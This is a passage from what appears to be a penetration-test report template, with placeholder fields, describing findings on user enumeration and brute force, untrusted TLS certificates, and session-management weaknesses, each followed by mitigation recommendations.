In its simplest form, an attacker could perform a brute force attack. 
In this, an attacker tries to guess a user account's credentials by automatically trying through passwords. 
Often very large word lists containing frequently used passwords are used for this purpose. 
An attacker could also use determined usernames to search past data leaks for passwords. 
Credentials from data leaks, consisting of pairs of usernames and passwords, can be reused by an attacker in an automated attack. 
This particular form of brute force attack, is also known as credential stuffing. 
Alternatively, an attacker can use usernames in the course of social engineering campaigns to contact users directly.
data.recommendation:
* Ensure that the web application always returns generic error messages when invalid usernames, passwords, or other credentials are entered. Identifies all relevant attack surfaces of the application for this purpose.
* If the application defines usernames itself, user enumeration can be effectively prevented. The prerequisite for this is that user names are randomly generated so that they cannot be guessed.
* The application can also use email addresses as usernames. If the username is not yet registered, an email message will contain a unique URL that can be used to complete the registration process. If the username exists, the user receives an email message with a URL to reset the password. In either case, an attacker cannot infer valid user accounts.
* As an additional security measure, you could delete default system accounts as well as test accounts or rename them before releasing the system to production.
data.short_recommendation: Identify all application attack surfaces relevant to User Enumeration and ensures that the web application always returns generic error messages when invalid credentials are entered.

data.title: Untrusted TLS certificates
data.summary:
Communication with the application at the transport layer level was not sufficiently protected due to untrusted TLS certificates. 
TLS is used by many protocols to ensure the confidentiality and integrity of communication between two endpoints. 
If web browsers do not trust an application's TLS certificate, the application may be vulnerable to man-in-the-middle attacks 
and thus susceptible to eavesdropping or tampering with traffic. 
Insufficient protection at the transport layer may allow communications between two parties to be compromised by an untrusted third party. 
An attacker could thus obtain sensitive data (e.g., credentials) if necessary. 
In the event of a successful attack, an attacker could gain complete control over all functions 
and data of the application by compromising a privileged user account.
data.description:
Transport Layer Security (TLS) is the successor to the now obsolete as well as insecure Secure Sockets Layer (SSL) protocol. 
TLS is a cryptographic protocol developed for secure, encrypted communication between two or more parties. 
The protocol is used in a wide variety of areas, including e-mail, instant messaging, and voice-over-IP. 
The best known use of TLS is on the Web, where it ensures secure communication over HTTPS. 
Primarily, TLS aims to ensure confidentiality, integrity, 
but also authenticity through the use of certificates, between two or more parties.

With TLS, the establishment of a secure connection takes place in several steps. 
Client and server agree on the use of TLS in the first step. 
This is done either by selecting a specific port (e.g. 443 for HTTP) or by making a protocol-specific request to the server (e.g. STARTTLS for SMTP). 
A handshake procedure then begins, in which the client and server negotiate various parameters for the security of the communication link. 
The handshake begins with the client and server agreeing on a respective supported cipher suite, consisting of the symmetric cipher and hash function. 
The server then issues a digital certificate. 
The certificate contains, among other things, the server name, the issuing certificate authority (CA), and the server's data asymmetric key. 
Once the client has verified the validity of the certificate, it generates a symmetric session key for the secure connection. 
This is done either by the client deriving a key from a random number. 
The client encrypts the random number with the server's data key and sends the result to the server. 
The server can use the private key to read the result and also derive the session key. 
However, the client and server could also use the Diffie-Hellman algorithm to securely agree on a random session key. 
Diffie-Hellman also offers the advantage of perfect forward secrecy (PFS). 
PFS prevents subsequent decryption once the server's private key is known. 
Session keys are not exchanged and thus cannot be reconstructed.

The security of TLS-secured communication is based primarily on the trustworthiness of the digital certificate. 
If the trustworthiness is not given, for example because the certificate has expired, 
it contains an incorrect host name or it is a self-signed certificate, no secure key exchange between two endpoints can be guaranteed from the outset. 
In some circumstances, the communication between two parties could be compromised by an untrusted third party in the course of a man-in-the-middle attack. 
For example, an attacker could gain access to sensitive data or inject malicious data into the encrypted data stream to compromise either the client or the server.

We reviewed the TLS certificates of the applications in scope and found untrusted certificates for the following applications:

| host | expired | expiring soon | incorrect host name | incomplete certificate chain | self-signed certificate |
|:---:|:---:|:---:|:---:|:---:|:---:|
| TODO:443 | - | - | - | - | - |
data.recommendation:
* Acquire new certificates for services that do not have trusted TLS certificates. 
* Generate sufficiently strong asymmetric keys with at least 2048 bits for certificates and protect the private key.
* Use only modern cryptographic hash algorithms such as SHA-256.'
* Make sure that the certificate contains the fully qualified name of the server. The following should also be considered when creating the certificate:
    * Consider whether the "www" subdomain should also be included.
    * Do not include unqualified host names in the certificate.
    * Do not include IP addresses.
    * Do not include internal domain names.
* Create and use wildcard certificates only when there is a real need. Do not use wildcard certificates for convenience.
* Choose an appropriate certificate authority that is trusted by all major browsers. For internal applications, an internal CA can be used. However, ensure that all users have imported the internal CA certificate and thus trust certificates issued by that CA. 
* Check the TLS configuration, including certificates, at regular intervals and adjust as necessary. There are a number of online tools (such as SSLabs, sslyze, etc) that you can use to quickly perform the check.
* For more information and help on TLS certificates, see the linked Transport Layer Protection Cheat Sheet from OWASP.
data.short_recommendation: Ensure that TLS certificates used are universally valid and trusted. Acquire new certificates for the affected services, if necessary. Also, follow best practices recommendations for secure TLS server configuration.

data.title: Session management weaknesses
data.summary:
We were able to identify weaknesses in the web application's session management. 
The users' sessions were usable without time restrictions and therefore did not require re-authentication at any time. 
People with access to a computer system could exploit this situation if another user had not explicitly logged out of the application beforehand.
data.description:
We tested how the application handles session lifetime and invalidation. Sessions remained valid without a time limit. We kept a session idle for `<DURATION>` and then replayed the session cookie `<COOKIE_NAME>`. The application accepted it without asking for re-authentication. `<ADDITIONAL_FINDINGS>`

An attacker who obtains a session token can reuse it for as long as the session stays valid. Tokens can leak through log files, proxy servers, browser history, or a shared or unattended computer where the user did not log out. Without an idle timeout or an absolute lifetime, the window for abuse has no upper bound.

We also checked whether the server invalidates the session on logout. `<LOGOUT_BEHAVIOUR>` After logout, the old token was still accepted on `<URL>`, which means a stolen token stays usable even after the user ends the session.
data.recommendation:
* User sessions in web applications should time out automatically after a certain period of inactivity.
* Depending on the criticality of the user authorization and the application, the timeout could be approximately between one hour and one day.
* Enforce an absolute session lifetime in addition to the idle timeout.
* Invalidate the session on the server at logout and after a password change.
* Require re-authentication for sensitive actions.
data.short_recommendation: Users should be logged out automatically after a certain period of inactivity.
